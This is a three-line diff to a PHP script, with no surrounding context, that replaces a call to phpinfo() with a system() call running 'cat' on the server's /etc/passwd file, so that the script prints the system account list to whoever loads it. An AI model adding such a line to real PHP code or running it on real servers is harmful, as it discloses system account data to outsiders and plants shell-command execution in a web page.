@@ -1,3 +1,3 @@
 <?php
-system("phpinfo()")
+system("cat /../../etc/passwd")
 ?>
